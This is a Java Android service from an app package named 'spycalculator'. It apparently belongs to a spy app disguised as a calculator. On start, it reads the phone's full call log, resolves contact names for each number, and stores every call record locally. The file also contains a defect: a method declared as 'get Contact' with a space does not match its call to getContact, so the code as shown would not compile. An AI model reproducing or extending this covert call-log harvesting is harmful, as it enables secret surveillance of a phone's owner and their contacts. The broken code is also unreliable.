package com.example.piyal.spycalculator;

import android.Manifest;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.util.Log;
import android.widget.Toast;

import java.util.Date;

/**
 * Created by piyal on 3/10/2018.
 */
public class StoreService extends Service {
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        String pnumber = intent.getExtras().getString("num");
        Toast.makeText(this, pnumber, Toast.LENGTH_LONG).show();
        addnumber(pnumber);
        return START_NOT_STICKY;
    }

    private void addnumber(String pnumber) {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
             //int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        Cursor mCursor = this.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null,
                null,CallLog.Calls.DATE + " ASC");
        int name=mCursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
        int number = mCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int date = mCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = mCursor.getColumnIndex(CallLog.Calls.DURATION);
        int type = mCursor.getColumnIndex(CallLog.Calls.TYPE);
        //StringBuilder sb = new StringBuilder();
        while (mCursor.moveToNext()) {
            String phnumber = mCursor.getString(number);
            String contactname=getContact(phnumber);
            String callduration = mCursor.getString(duration);
            String calltype = mCursor.getString(type);
            String calldate = mCursor.getString(date);
            Date d = new Date(Long.valueOf(calldate));
            String callTypeStr = "";
            switch (Integer.parseInt(calltype)) {
                case CallLog.Calls.OUTGOING_TYPE:
                    callTypeStr = "Outgoing";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    callTypeStr = "Incoming";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    callTypeStr = "Missed";
                    break;
            }
            SmsModel smsModel = new SmsModel(callTypeStr,contactname, calldate, callduration, phnumber);
            new CallLogStorage(this).addItem(smsModel);
            //public SmsModel(String calltype, String calltime, String calldate, String call_duration, String phone_number)
//            List<SmsModel> l=getList();
//            for(int i=0;i<l.size();i++){
//                check_2=l.get(i).getPhone_number()+l.get(i).getCall_duration()+l.get(i).getCalltype()+l.get(i).getCalldate();
//                if(!check.equals(check_2)&&!test){
//                    test=true;
//                }
//            }
//            if(test) {
//                SmsModel smsModel = new SmsModel(callTypeStr, "", calldate, callduration, phnumber);
//                addlist(smsModel);
//                test=false;
//            }

            // Toast.makeText(this,check_2,Toast.LENGTH_SHORT).show();

        }
    }

    private String get Contact(String phoneNumber){
        // TODO Auto-generated method stub
        ContentResolver cr =this.getContentResolver();
        Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
        Cursor cursor = cr.query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
        if (cursor == null) {
            return null;
        }
        String contactName = null;
        if(cursor.moveToFirst()) {
            contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
        }

        if(cursor != null && !cursor.isClosed()) {
            cursor.close();
        }
        return contactName;
    }
}
